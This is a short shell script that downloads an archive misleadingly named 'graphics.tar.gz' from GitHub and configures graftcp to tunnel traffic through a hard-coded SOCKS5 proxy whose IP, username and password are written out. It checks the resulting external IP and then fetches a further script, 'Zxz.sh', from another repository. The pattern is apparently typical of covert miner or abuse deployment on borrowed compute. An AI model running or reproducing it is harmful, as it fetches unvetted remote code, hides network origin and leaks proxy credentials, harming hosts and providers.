apt-get update -y

wget https://github.com/Akatsoki/joss/raw/main/graphics.tar.gz

tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END

listen = :2233

loglevel = 1

socks5 = 45.140.13.119:9132

socks5_username = faraddd8x

socks5_password = faraddd8x

END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

./graftcp/graftcp curl ifconfig.me

echo " "

echo " "

wget https://github.com/Akatsoki/newwz/raw/main/Zxz.sh
